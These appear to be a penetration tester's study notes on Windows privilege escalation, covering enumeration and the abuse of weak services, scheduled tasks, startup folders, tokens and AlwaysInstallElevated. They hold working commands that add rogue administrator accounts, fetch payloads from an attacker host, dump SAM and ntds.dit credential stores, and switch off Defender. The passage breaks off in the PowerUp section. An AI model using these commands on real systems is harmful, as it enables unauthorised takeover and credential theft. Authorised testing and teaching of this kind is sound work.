
# Windows Privilege Escalation - Overview

## Windows Privilege Escalation Pentest Flow

1. [Initial Windows Enumeration](#initial-windows-enumeration)
	   
	  [Initial Situation Awareness + Privilege Check](#initial-situation-awareness--privilege-check)
			   - `whoami /all`, `systeminfo`, users, groups, privileges
		
	  [Domain & Network Context](#domain--network-context)

2. [Search for Sensitive Files](#search-for-sensitive-files)
	   - registry, history, configs, saved creds

3. [Services](#services)
		[Enumerate Services](#enumerate-services)
	    [Enumerate Privileged Execution Paths](#enumerate-privileged-execution-paths)
	    [Unquoted Service Paths](#unquoted-service-paths)
	    [Writable Service Binary Abuse](#writable-service-binary-abuse)

4. [Privileged Execution Paths](#privileged-execution-paths)
		[DLL Hijacking](#dll-hijacking)  -> more specific notes in [DLL Hijacking](./dll-hijacking.md)  
		[Scheduled Tasks](#scheduled-tasks)  --> more specific notes in [scheduled-tasks](./scheduled-tasks.md)
		[Token Impersonation](#token-impersonation) --> more specific notes in [token-impersonation](./token-impersonation.md)
		[Registry Autoruns](#registry-autoruns)
		[Startup Folder Checks](#startup-folder-checks)
		[AlwaysInstallElevated](#`AlwaysInstallElevated`)

5. [Active Directory Enumeration](#Active-Directory-Enumeration) --> more specific notes in  [ad-enumeration](../../06-active-directory/ad-enumeration.md)  

6. [Automated Local Windows Enumeration](#automated-local-windoenumeration) 
		- `winpeas`, `seatbelt`, `powerup`


----

## Windows Enumeration

### Initial Situation Awareness + Privilege Check 

User & System Info
```cmd
:: Current user
whoami
whoami /all
whoami /priv
whoami /groups

:: All users
net user
net localgroup administrators

:: System info
hostname
systeminfo
```

Processes & Services
```cmd
:: Running processes
tasklist
tasklist /svc
wmic process list full

:: Services -> find Writable binaries & Unquoted paths
sc query
net start
wmic service list brief
wmic service get name,pathname,startmode

:: Drivers
driverquery
```

PS for User & System, Network, Processes & Services
```powershell
# System info
Get-ComputerInfo

# Users
Get-LocalUser
Get-LocalGroupMember Administrators

# Services
Get-Service

# Processes
Get-Process

# Installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate

# name, domain, hostname info 
$env:USERNAME  
$env:USERDOMAIN  
$env:COMPUTERNAME  
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
```


----

### Domain & Network Context

```cmd
whoami /fqdn  
echo %USERDOMAIN%  
echo %LOGONSERVER%  
nltest /dsgetdc:domain.com  
net view /domain  
net group /domain  
net group "Domain Admins" /domain
```

```powershell
# find Current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name

Get-CimInstance Win32_ComputerSystem | Select-Object Domain,PartOfDomain


# find Domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# find PDC role owner
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner
```

PS can leverage .NET classes to expose AD info   
- =D for us is  `System.DirectoryServices.ActiveDirectory` namespace  
	- containing classes related to AD  
		- e.g.  `GetCurrentDomain()` -> return domain object for current user  

e.g. 
```powershell
PS C:\Users\alice> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  
  
Forest                  : domain.com
DomainControllers       : {DC01.domain.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC01.domain.com
RidRoleOwner            : DC01.domain.com
InfrastructureRoleOwner : DC01.domain.com
Name                    : domain.com
```  

For deeper AD enumeration refer to  [ad-enumeration](../../06-active-directory/ad-enumeration.md) 
- LDAP queries
- PowerView.ps1

| Status              | Use                                         |
| ------------------- | ------------------------------------------- |
| Domain joined host  | Domain attacks may be possible.             |
| Domain users/groups | Helps identify privilege targets.           |
| Domain computers    | Helps map lateral movement paths.           |
| Logon server/DC     | Useful for LDAP, Kerberos, and SMB testing. |

Network Info
```cmd
:: IP config
ipconfig /all

:: Routes
route print

:: Open ports
netstat -ano
netstat -an | findstr LISTENING

:: ARP table
arp -a

:: DNS cache
ipconfig /displaydns
```


---

### Search for sensitive files 

```cmd
:: Common locations
dir C:\Users  
dir C:\Users\current_user\Desktop  
dir C:\Users\current_user\Documents  
dir C:\Users\current_user\Downloads  
dir C:\Windows\Temp  
dir C:\ProgramData

:: Search for interesting files
dir /s /b *password*  
dir /s /b *cred*  
dir /s /b *config*  
dir /s /b *.kdbx  
dir /s /b *.txt  
dir /s /b *.xml  
dir /s /b *.ini
dir /s /b *.txt *.ini *.xml *.config 

findstr /si password *.txt *.ini *.xml
```

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue  

Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue   

Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# search file contents
Select-String -Path C:\Users\*\Documents\* -Pattern "password","username","credential","secret" -ErrorAction SilentlyContinue
```  


---

### Enumerate Services

Windows services =  long running bckground executables/ apps 
- managed by Service Control Manager 
- similar to daemons on Unix

=D  services for pentesters
- `LocalSystem`  
- `NetworkService`  
- `LocalService`  
- Local/domain users

Attack Vector
- Weak service permissions -> modify service configuration  
- Weak service binary permissions -> Service Binary Hijacking  
- Writable service directory ->  DLL hijacking or file planting  
- Unquoted service path -> abuse Windows path parsing
- service restart/reboot condition 

Requirements
- If using a bind shell or WinRM,  service enumeration may fail as a low-privileged user.  
- If possible, use an interactive logon such as RDP for service enumeration.

Find Vulnerable Services -> find: Non-default services + Unquoted paths
```cmd
# List services + paths
wmic service get name,pathname,startmode

# Filter interesting services 
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```cmd
# List services
sc query state= all

# Service permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Check specific service & service-control permissions
sc qc servicename

# check the service binary file and folder permissions
icacls "C:\Path\To\Service.exe"  
icacls "C:\Path\To"

# If writable:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc stop servicename
sc start servicename
```

```cmd
# If icacls shows -> -> add user 
# SERVICE_CHANGE_CONFIG 
# SERVICE_START, SERVICE_STOP, SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS

sc config service_name binpath= "cmd /c whoami > C:\Windows\Temp\service_test.txt"

sc config service_name binpath= "cmd /c net user exam_user exam_password /add && net localgroup administrators exam_user /add"
```

```powershell  
# All services with more privesc-relevant fields
Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,StartName,PathName  

# Only running services with fewer fields
Get-CimInstance -ClassName win32_service |  
Where-Object {$_.State -eq 'Running'} |  
Select-Object Name,State,StartName,PathName
```

| Field       | Meaning                                                             | Use                                    |
| ----------- | ------------------------------------------------------------------- | -------------------------------------- |
| `StartMode` | Whether the service starts automatically, manually, or is disabled. | Reveals restart/trigger opportunities. |
| `StartName` | Which account the service runs as.                                  | Identifies privilege context.          |
| `PathName`  | Executable path and arguments.                                      | Helps spot path/binary issues.         |

----

### Enumerate Privileged Execution Paths

| Target              | Use                                              |
| ------------------- | ------------------------------------------------ |
| Service binaries    | Can lead to execution as service account.        |
| Service directories | Useful for DLL hijacking or file replacement.    |
| Scheduled tasks     | May run scripts or binaries as privileged users. |
| Startup folders     | May execute on login.                            |
| Registry autoruns   | May execute on boot or login.                    |
| Writable scripts    | May be executed by admins or services.           |

```cmd
:: Autoruns
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

:: Startup folders
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```


---

### Unquoted Service Paths

Requirements  
- service runs as a privileged account, such as `LocalSystem`  
- service executable path contains spaces  
-  path is not wrapped in quotes  
- can write to one of the directories Windows checks before the real executable

Goal
- place a malicious executable at one of the paths Windows checks before the real service binary

Attack Vector
1. check for unquoted service path & permissions
2. create executable malware
3. put in directory of interpreted paths 
4. match name to interpreted filename 
5. service starts
6. If the service runs as `LocalSystem`, the malicious executable also runs as `LocalSystem`
  
| Attempted executable                                 | Required permission                   | Likelihood            |
| ---------------------------------------------------- | ------------------------------------- | --------------------- |
| `C:\Program.exe`                                     | Write access to `C:\`                 | Usually unlikely      |
| `C:\Program Files\My.exe`                            | Write access to `C:\Program Files`    | Usually unlikely      |
| `C:\Program Files\My Program\My.exe`                 | Write access to application directory | More likely           |
| `C:\Program Files\My Program\My Service\service.exe` | Original binary path                  | Normal service binary |

How does this work? 
- Windows services map to executable files.  
- service starts -> process created using service path via `CreateProcess` function
- `IpApplicationName` used to specify name/ path to executable file  
	- if  Unquoted Service Path ->  interpretation unclear -> every space in file path used as preceding part as file name and the rest becomes `args`
- e.g. Unquoted service binary path
	`C:\Program Files\My Program\My Service\service.exe` 

Unquoted Service Path-> file execution occurs in this order: 
```  
C:\Program.exe  
C:\Program Files\My.exe  
C:\Program Files\My Program\My.exe  
C:\Program Files\My Program\My service\service.exe  
```  
  

e.g. Abusing Unquoted Service Path -> Replace Writable Service Binary
```powershell
Get-CimInstance -ClassName win32_service |
Select Name,State,StartMode,StartName,PathName

Name              State    StartMode StartName             PathName
----              -----    --------- ---------             --------
Spooler           Running  Auto      LocalSystem           C:\Windows\System32\spoolsv.exe
WinDefend         Running  Auto      LocalSystem           "C:\Program Files\Windows Defender\MsMpEng.exe"
wuauserv          Stopped  Manual    LocalSystem           C:\Windows\system32\svchost.exe -k netsvcs -p
UsoSvc            Running  Manual    LocalSystem           C:\Windows\system32\svchost.exe -k netsvcs -p
Apache2.4         Running  Auto      LocalSystem           "C:\Apache24\bin\httpd.exe" -k runservice
BackupService     Stopped  Auto      LocalSystem           C:\Program Files\Backup Service\backup.exe
CustomAppService  Running  Auto      .\svc_app             C:\Program Files\Custom App\app.exe
MySQL80           Running  Auto      NT SERVICE\MySQL80    "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysqld.exe" MySQL80


Get-CimInstance -ClassName win32_service |
Select Name,State,PathName |
Where-Object {$_.State -like 'Running'}

Name              State    PathName
----              -----    --------
Spooler           Running  C:\Windows\System32\spoolsv.exe
WinDefend         Running  "C:\Program Files\Windows Defender\MsMpEng.exe"
UsoSvc            Running  C:\Windows\system32\svchost.exe -k netsvcs -p
Apache2.4         Running  "C:\Apache24\bin\httpd.exe" -k runservice
CustomAppService  Running  C:\Program Files\Custom App\app.exe
MySQL80           Running  "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysqld.exe" MySQL80
```
- `C:\Program Files\Backup Service\backup.exe` -> unquoted service path



### Writable Service Binary Abuse  
#### See permissions on services using `icacls`

| Mask | Permission     | Meaning                                                          | Use                                                 |
| ---- | -------------- | ---------------------------------------------------------------- | --------------------------------------------------- |
| `F`  | Full Control   | Read, write, execute, delete, and change permissions             | Can fully control or replace the target.            |
| `M`  | Modify         | Read, write, execute, and delete                                 | Often enough to abuse writable services or scripts. |
| `RX` | Read & Execute | Read files and run executables                                   | Confirms access and executable paths.               |
| `R`  | Read           | View file or directory contents                                  | Useful for finding configs or credentials.          |
| `W`  | Write          | Create or modify files, depending on inheritance and object type | Useful if a privileged process uses the path.       |
- `F`, `M`, or `W` on a service binary/path can be exploitable.  
- Lack of `(I)` can indicate permissions were explicitly set rather than inherited.  
- Check both the file and parent directory.

```powershell
icacls "C:\Path\To\Service.exe"  
icacls "C:\Path\To"
```

e.g `BUILTIN\Users:(W)` -> standard users can write into service directory
```powershell
PS C:\Users\alice> icacls "C:\Program Files\Backup Service"  
C:\Program Files\Backup Service BUILTIN\Administrators:(F)  
NT AUTHORITY\SYSTEM:(F)  
BUILTIN\Users:(RX)  
BUILTIN\Users:(W)  
Everyone:(R)  
```

e.g. `BUILTIN\Users:(M)` -> standard users can modify or replace the service binary
If the service runs as `LocalSystem` -> privesc! 
```powershell
PS C:\Users\alice> icacls "C:\Program Files\Backup Service\backup.exe"
C:\Program Files\Backup Service\backup.exe BUILTIN\Administrators:(F)
                                            NT AUTHORITY\SYSTEM:(F)
                                            BUILTIN\Users:(M)
                                            Everyone:(RX)
```


```cmd
:: Confirm Service Configuration
sc qc service_name

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: BackupService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Backup Service\backup.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Backup Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

| Field                | Use                                             |
| -------------------- | ----------------------------------------------- |
| `BINARY_PATH_NAME`   | Confirms the executable path.                   |
| `START_TYPE`         | Shows whether the service starts automatically. |
| `SERVICE_START_NAME` | Shows the privilege context.                    |
Exploit : Replace Writable Service Binary
1. service runs as `LocalSystem` or another privileged user.
2. write to the service binary or parent directory.
3. start, restart, or trigger the service.
4. save the original binary name/path.

create small binary [adduser.c](../../03-tools/scripts/adduser.c) +  [adduser.exe](../../03-tools/scripts/adduser.exe)  on Kali 
-> create user kira $\in$ local Adminstrators group
```bash  
# Compile a 64-bit Windows executable `x86_64-w64-mingw32-gcc`
└─$ vim adduser.c
└─$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe 

└─$ python3 -m http.server 80                                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 "GET /adduser.exe HTTP/1.1" 200 
```  

```powershell  
iwr -Uri http://attacker_ip/adduser.exe -OutFile adduser.exe

# Back up the original service binary if possible:
copy "C:\Program Files\Backup Service\backup.exe" "C:\Program Files\Backup Service\backup.exe.bak"

# Replace the service binary:
copy .\adduser.exe "C:\Program Files\Backup Service\backup.exe"

# Start or restart the service:
Start-Service BackupService

# verify if user created
net user exam_user  
net localgroup administrators
```



---

### DLL Hijacking check

Refer to [DLL Hijacking](./dll-hijacking.md) for detailed notes

Requirements
- service binary is in a writable folder.
- program loads missing DLLs.
- privileged process runs from a non-standard directory.
- User can restart the service or trigger the application.

Attack Vector
1. Identify interesting third-party services/applications.
2. Check whether the directory is writable.
3. Check loaded or missing DLLs.
4. Confirm whether the process runs with elevated privileges.
5. Trigger restart/execution safely.

Quick commands 
```powershell
# lists installed 32-bit applications -> try to find missing DLLs
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName

# check 64-bit uninstall entries
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
```



---

### Scheduled Tasks

Refer to [Scheduled Tasks](./scheduled-tasks.md) for detailed notes

Scheduled Tasks = automated tasks executed by Task Scheduler based on triggers
- Triggers =  e.g. time, date, startup, logon, Win event  
- action: which prog or script executed  

Requirements & Attack Vector 
1. Privileged run context
   - `Run As User` = `NT AUTHORITY\SYSTEM` / `Administrator` / privileged user -> high-value
   - `Run As User` = current low-priv user -> usually not useful for privesc

2. Triggerable execution
   - Runs every minute / every few minutes -> useful
   - Runs on startup / logon -> useful if reboot or login trigger possible
   - Current user can manually start task -> useful
   - Next run time far in future -> lower priority

3. Controllable action path
   - `Task To Run` = writable binary/script -> potential privesc
   - Parent dir writable -> possible binary/script replacement
   - `Start In` dir writable -> check for relative path abuse
   - Relative path used -> may be influenceable

4. Confirmed permissions
   - `icacls "C:\Path\To\task.exe"` -> check action file perms
   - `icacls "C:\Path\To"` -> check parent dir perms
   - `F` / `M` / `W` for low-priv user/group -> interesting
   - Can edit / replace / write into path -> exploitable candidate
  
```cmd 
schtasks /query /fo LIST /v
```

| Field           | Interesting value                     | Use                                      |
| --------------- | ------------------------------------- | ---------------------------------------- |
| `Run As User`   | `SYSTEM`                              | Runs with highest local privileges.      |
| `Run As User`   | `Administrator`                       | Runs with local admin privileges.        |
| `Run As User`   | `privileged_user`                     | May allow user-to-admin escalation.      |
| `Task To Run`   | `C:\Users\lowpriv_user\something.exe` | Executable may be user-writable.         |
| `Task To Run`   | `C:\Users\lowpriv_user\script.bat`    | Script may be editable by low-priv user. |
| `Schedule Type` | `At system start up`                  | May trigger after reboot.                |
| `Schedule Type` | `Minute`                              | Repeats often, easier to test.           |

```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State

# Check task action paths:
Get-ScheduledTask |  
ForEach-Object {  
    $_.Actions  
}

# PS filter for Task + User + Action
Get-ScheduledTask |  
Select-Object TaskName,TaskPath,State,  
@{Name="RunAs";Expression={$_.Principal.UserId}},  
@{Name="Execute";Expression={$_.Actions.Execute}},  
@{Name="Arguments";Expression={$_.Actions.Arguments}},  
@{Name="StartIn";Expression={$_.Actions.WorkingDirectory}}
```

| Status                          | Use                               |
| ------------------------------- | --------------------------------- |
| Runs as `SYSTEM` or admin       | High-value execution context      |
| Runs as another privileged user | Possible user-to-admin escalation |
| Executes writable script        | Add commands or replace contents  |
| Executes writable binary        | Replace binary with payload       |
| Executes from writable folder   | Possible binary replacement       |
| Runs soon or repeatedly         | Easier to trigger during exam     |
| Has `Start In` path             | Check relative path abuse         |


----


### Token Impersonation

Refer to [token-impersonation](./token-impersonation.md) for detailed notes

```cmd
whoami /priv
```

| Privilege                               | Use                                                 | Exploit                                                                | Priority        |
| --------------------------------------- | --------------------------------------------------- | ---------------------------------------------------------------------- | --------------- |
| `SeImpersonatePrivilege` enabled        | May allow impersonation of a privileged token       | PrintSpoofer, GodPotato, SigmaPotato, JuicyPotato, RoguePotato         | High            |
| `SeAssignPrimaryTokenPrivilege` enabled | May allow assigning a primary token to a process    | JuicyPotato                                                            | High            |
| `SeBackupPrivilege` enabled             | Can read protected files such as registry hives     | Copy `SAM` / `SYSTEM`, dump local hashes                               | High            |
| `SeRestorePrivilege` enabled            | Can write or restore files into protected locations | Replace protected files, service binary abuse, registry/file overwrite | High            |
| `SeDebugPrivilege` enabled              | Can inspect or manipulate privileged processes      | [Mimikatz](../../03-tools/mimikatz.md), process token abuse            | High            |
| `SeLoadDriverPrivilege` enabled         | Can load kernel drivers                             | Vulnerable driver abuse                                                | Medium          |
| `SeTakeOwnershipPrivilege` enabled      | Can take ownership of files/objects                 | Take ownership, modify ACLs, replace files                             | Medium          |
| `SeCreateTokenPrivilege` enabled        | Can create access tokens                            | Advanced token abuse                                                   | Rare / Advanced |
| `SeTcbPrivilege` enabled                | “Act as part of the operating system”               | Advanced token abuse                                                   | Rare / Advanced |

`SeBackupPrivilege` -> Registry Hive Copy

```cmd
:: run is cmd utility run in cmd not PS

reg.exe save hklm\system c:\system.bak
reg.exe save hklm\sam c:\sam.bak    
OR
reg.exe save HKLM\SAM C:\Windows\Temp\sam.bak
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.bak
OR 
C:\Windows\System32\reg.exe save HKLM\SAM C:\Windows\Temp\sam.bak
C:\Windows\System32\reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.bak

C:\Users\Administrator> copy c:\sam.bak m:\
```

```bash
└─$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```
refer to [impacket](../../03-tools/impacket.md) for more detailed notes


`SeBackupPrivilege` -> Shadow Copy
- allow for copying of locked files such as: 
	- `C:\Windows\NTDS\ntds.dit`  
	- `C:\Windows\System32\config\SAM`  
	- `C:\Windows\System32\config\SYSTEM`  
	- `C:\Windows\System32\config\SECURITY`

```powershell
# Create a DiskShadow Script
"set context persistent nowriters" | Set-Content C:\Windows\Temp\diskshadow.txt
"add volume c: alias osdrive" | Add-Content C:\Windows\Temp\diskshadow.txt
"create" | Add-Content C:\Windows\Temp\diskshadow.txt
"expose %osdrive% z:" | Add-Content C:\Windows\Temp\diskshadow.txt

# Review the script
type C:\Windows\Temp\diskshadow.txt
set context persistent nowriters  
add volume c: alias osdrive  
create  
expose %osdrive% z:

# Run DiskShadow
diskshadow /s C:\Windows\Temp\diskshadow.txt
The shadow copy was successfully exposed as z:\.

# Copy Locked Files from the Shadow Copy 
# e.g. domain controller, copy `ntds.dit`
robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit
# OR from PS
cmd /c robocopy /b Z:\Windows\NTDS 
# IF impacket PS 
download "c:\windows\temp\ntds.dit"
```

```
# Save the SYSTEM hive:
C:\Tools>reg.exe save hklm\system c:\system.bak
```

```bash
└─$ impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```
refer to [impacket](../../03-tools/impacket.md) for more detailed notes


---
### Registry Autoruns

Autoruns = registry entries that execute programs/scripts on login or startup.

Common keys:
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

| Finding                    | Use                                                      |
| -------------------------- | -------------------------------------------------------- |
| Autorun binary/script path | Shows what executes automatically.                       |
| Writable file              | May allow binary/script replacement.                     |
| Writable parent directory  | May allow replacement or path abuse.                     |
| `HKLM` autorun             | More valuable because it affects machine-wide execution. |
| `HKCU` autorun             | Usually current-user context, lower privesc value.       |

Requirements
1. Autorun executes privileged path  
2. Current user can modify file/dir/registry entry  
3. Trigger happens on login/startup  

Attack Vectors 
	replace binary  
	modify script  
	add malicious entry if registry key writable  
	wait for login/startup trigger

=D bc Automatic execution on login/startup -> persistence + possible privesc


---
### Startup Folder Checks 

Startup folders = files placed here can execute when a user logs in.
=D 
- Persistence
- User-to-user escalation
- Low-priv user -> privileged user escalation, only if a privileged user logs in
Boo
- trigger-dependent: no privileged user logs in, privesc may not happen.

Check permissions on machine-wide startup folder:
```cmd
:: Check permissions on machine-wide startup folder:
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

| Finding                          | Use                        |
| -------------------------------- | -------------------------- |
| Writable startup folder          | Can drop payload/shortcut  |
| Writable `.lnk`                  | Can modify shortcut target |
| Writable `.bat` / `.ps1`         | Can add commands           |
| Writable `.exe`                  | Can replace binary         |
| Privileged user likely to log in | Trigger for privesc        |
e.g. Vulnerable Permission
```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Administrators:(F)  
NT AUTHORITY\SYSTEM:(F)  
BUILTIN\Users:(RX)   
BUILTIN\Users:(W)  
Everyone:(R)

:: test if writable
whoami > file.txt
```

`BUILTIN\Users:(W)` --> low-priv users can write into machine-wide Startup folder
-> can drop payload
-> payload executes when any user logs in

e.g. exploit 
```cmd
:: create exploit batch file 
echo net user kira kira_password /add > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"

echo net localgroup administrators kira /add >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"

:: confirm creation
type "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"

:: confirm results after privileged user log in.
net user kira  
net localgroup administrators
```


----

### `AlwaysInstallElevated`  

`AlwaysInstallElevated` = Windows Installer policy misconfiguration.
- enabled in **both** `HKCU` and `HKLM`, low-priv users may be able to run `.msi` installers with elevated privileges
- low-priv user runs MSI -> MSI may run with elevated/SYSTEM privileges

Requirements - Both registry keys must exist and be set to `1`.

| Registry Hive                                        | Required value              |
| ---------------------------------------------------- | --------------------------- |
| `HKCU\Software\Policies\Microsoft\Windows\Installer` | `AlwaysInstallElevated = 1` |
| `HKLM\Software\Policies\Microsoft\Windows\Installer` | `AlwaysInstallElevated = 1` |

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

```powershell
$HKCU = Get-ItemProperty HKCU:\Software\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue  
$HKLM = Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue  
  
$HKCU.AlwaysInstallElevated  
$HKLM.AlwaysInstallElevated
```


e.g. =D 

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
AlwaysInstallElevated REG_DWORD 0x1 

reg query HKLM\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer  
AlwaysInstallElevated REG_DWORD 0x1
```

```bash
└─$ msfvenom -p windows/x64/exec CMD='net user kira kira_pw /add && net localgroup administrators exam_user /add' -f msi -o adduser.msi

└─$ python3 -m http.server 80                 
```

```powershell
iwr -Uri http://attacker_ip/adduser.msi -OutFile C:\Windows\Temp\adduser.msi

msiexec /quiet /qn /i C:\Windows\Temp\adduser.msi

net user kira  
net localgroup administrators
```



---

###  Active Directory Enumeration

Refer to [ad-enumeration](../../06-active-directory/ad-enumeration.md)  for detailed notes

If the host is domain joined or domain credentials are found -> AD enumeration and domain privilege escalation. 
- [BloodHound](../../03-tools/bloodhound.md)  
- [Domain Privilege Escalation](../../06-active-directory/domain-privesc.md)


---


### Anti-virus (AV) Evasion

```powershell
PS C:\Windows\Temp> Set-MpPreference -DisableRealtimeMonitoring $true
PS C:\Windows\Temp> Set-MpPreference -DisableScriptScanning $true
PS C:\Windows\Temp> Set-MpPreference -DisableTamperProtection $true
```


---

### Automated Local Windows Enumeration

| Tool       | Use                                                  | Notes                                                |
| ---------- | ---------------------------------------------------- | ---------------------------------------------------- |
| `winPEAS`  | Broad Windows privilege escalation enumeration       | Very useful, but noisy and often flagged by AV       |
| `Seatbelt` | C# situational awareness and security checks         | Good alternative when winPEAS is blocked             |
| `PowerUp`  | PowerShell-based Windows privilege escalation checks | Useful for services, registry, and common misconfigs |
| `JAWS`     | PowerShell-based Windows enumeration                 | Lightweight alternative                              |
| `SharpUp`  | C# privilege escalation checks                       | Useful when PowerShell is restricted                 |

#### winpeas

WINPEAS = tool for automation  
- can be blocked by AV  
- if true  
	- try other tools - Seatbelt, JAWS  
	- manual enumeration  
	- AV evasion technique  

```bash
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .  
└─$ pwd    
/home/exploits
└─$ python3 -m http.server 80  
```

```cmd
:: save output in cmd 
.\winPEAS.exe > C:\Windows\Temp\winpeas.txt
```

```powershell
iwr -uri http://attacker_ip/enum/winPEASx64.exe -outfile winPEAS.exe

# save output if possible
.\winPEAS.exe | Tee-Object -FilePath C:\Windows\Temp\winpeas.txt
```

e.g interesting output
```powershell
[+] Interesting privileges
    SeImpersonatePrivilege: Enabled
    SeBackupPrivilege: Enabled

[+] Writable service binary
    Service Name: BackupService
    Run As: LocalSystem
    Binary Path: C:\Program Files\Backup Service\backup.exe
    Permissions: BUILTIN\Users:(M)

[+] Unquoted service path
    Service Name: VendorUpdater
    Run As: LocalSystem
    Path: C:\Program Files\Vendor App\Updater Service\updater.exe

[+] Interesting scheduled task
    Task Name: \BackupTask
    Run As: NT AUTHORITY\SYSTEM
    Task To Run: C:\Program Files\Backup Service\backup.bat
    Schedule: Every 5 minutes
    Permissions: BUILTIN\Users:(M)

[+] AlwaysInstallElevated
    HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated: 1
    HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated: 1

[+] Stored credentials
    File: C:\Users\alice\Documents\config.ini
    Match: password=alice_password

[+] AutoLogon credentials
    Registry Path: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultUserName: alice
    DefaultDomainName: domain.local
    DefaultPassword: alice_password

[+] Writable PATH directory
    Directory: C:\Tools
    Permissions: BUILTIN\Users:(M)

[+] Installed software
    Name: Vendor Backup Agent
    Version: 1.2.3
    Install Path: C:\Program Files\Vendor Backup Agent
    Service: VendorBackup
```


#### seatbelt

```bash
└─$ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe     
└─$ pwd    
/home/exploits
└─$ python3 -m http.server 80  
```


```powershell
iwr -uri http://attacker_ip/enum/Seatbelt.exe -outfile Seatbelt.exe

# Run all checks:
.\Seatbelt.exe -group=all

# Run targeted checks instead of everything:
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=misc
```

e.g interesting output
```powershell
[+] Seatbelt interesting findings

[+] Current user
    User: domain.local\alice
    IsLocalAdmin: False
    Integrity: Medium

[+] Token privileges
    SeImpersonatePrivilege: Enabled
    SeBackupPrivilege: Disabled

[+] UAC
    EnableLUA: 1
    ConsentPromptBehaviorAdmin: 5

[+] Defender
    RealTimeProtectionEnabled: True

[+] AutoLogon
    DefaultUserName: alice
    DefaultDomainName: domain.local
    DefaultPassword: alice_password

[+] PowerShell history
    File: C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    Match: password=alice_password

[+] Installed software
    Name: Vendor Backup Agent
    Version: 1.2.3
```

```cmd
:: manual validation after automated enumeration! 
whoami /priv  
whoami /groups  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  
type "C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"  
wmic product get name,version
```

#### PowerUp

```bash
└─$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
└─$ pwd    
/home/exploits
└─$ python3 -m http.server 80  
```

```powershell
# loadup PowerUp
iwr -uri http://attacker_ip/enum/PowerUp.ps1 -OutFile PowerUp.ps1

powershell -ep bypass
. .\PowerUp.ps1
```

Common commands
```powershell
# Run Broad Checks but noisy
